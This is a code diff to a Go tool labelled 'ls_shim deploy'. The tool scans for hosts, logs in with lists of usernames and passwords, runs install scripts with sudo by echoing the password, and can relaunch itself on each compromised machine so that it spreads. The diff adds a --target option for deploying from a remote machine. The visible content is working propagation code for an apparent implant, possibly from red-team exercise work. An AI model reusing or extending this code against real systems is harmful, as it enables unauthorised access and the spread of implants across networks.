@@ -17,6 +17,7 @@ var isVerbose bool = false
 var isDemo bool = false
 var isThreaded bool = false
 var isTarget bool = false
+var targetIP string
 var usernames []string
 var passwords []string
 var installedIPs []string
@@ -35,12 +36,17 @@ func main() {
 	if isVerbose {
 		fmt.Println("Dependencies installed")
 	}
-	ips := findIPs()
-	fmt.Print("IP list: ")
-	fmt.Println(ips)
-	if !isDemo {
-		transferFiles(ips)
+	if isTarget && !isDemo {
+		transferFiles([]string{targetIP})
+	} else {
+		ips := findIPs()
+		fmt.Print("IP list: ")
+		fmt.Println(ips)
+		if !isDemo {
+			transferFiles(ips)
+		}
 	}
+
 	if isVerbose && !isDemo {
 		fmt.Println("Installed on the following IPs:")
 		for i := 0; i < len(installedIPs); i++ {
@@ -70,9 +76,9 @@ func runRemote(username, password, ip string) {
 		"echo " + password + " | sudo -S ./deploy/dependencies.sh\n" +
 		"echo " + password + " | sudo -S chmod +x install.sh\n" +
 		"echo " + password + " | sudo -S ./install.sh\n"
-	if true {
+	if isTarget {
 		command += "cd deploy\n" +
-			"echo " + password + " | sudo -S go run deploy.go -i " + GetOutboundIP() + " -m --user-list " + strings.Join(usernames, ",") + " --password-list" + strings.Join(passwords, ",") + "\n"
+			"echo " + password + " | sudo -S go run deploy.go -i " + GetOutboundIP() + " -m --user-list " + strings.Join(usernames, ",") + " --password-list " + strings.Join(passwords, ",") + "\n"
 		fmt.Println(command)
 		os.Exit(0)
 	}
@@ -272,7 +278,11 @@ func handleArgs(args []string) bool {
 				}
 				pIsList = true
 				passwords = strings.Split(args[i+1], ",")
-			} else if args[i] == "--ignore" || args[i] == "-i" {
+			} else if args[i] == "-i" || args[i] == "--ignore" {
+				if isTarget {
+					fmt.Println("Error: --ignore is not compatible with --target")
+					return false
+				}
 				ignoreIPs = strings.Split(args[i+1], ",")
 			} else if args[i] == "-v" || args[i] == "--verbose" {
 				if !isThreaded {
@@ -288,12 +298,20 @@ func handleArgs(args []string) bool {
 					fmt.Println("Error: verbose is not compatible with multithreading")
 					return false
 				}
+			} else if args[i] == "-t" || args[i] == "--target" {
+				if len(ignoreIPs) != 0 {
+					fmt.Println("Error: --ignore is not compatible with --target")
+					return false
+				}
+				isTarget = true
+				targetIP = args[i+1]
 			} else if args[i] == "--help" || args[i] == "-h" {
 				fmt.Println("ls_shim deploy\n\n" +
 					"usage: go run deploy.go -u [username] -p [password] [args]\n" +
 					"-v or --verbose			|	Enable verbose output\n" +
 					"-i [IPs] or --ignore [IPS]	|	Specify a list of IPs to ignore, separated by commas\n" +
 					"-m or --multi			|	Run in multithreaded mode. Not compatible with verbose.\n" +
+					"-t [IP] or --target [IP]			|	Install & deploy from a remote machine. Not compatible with -i\n" +
 					"--help or -h			|	Display this help menu\n" +
 					"--password-list [PASSWORDS]	|	Specify a list of passwords, separated by commas\n" +
 					"--user-list [USERS]		|	Specify a list of users, separated by commas",
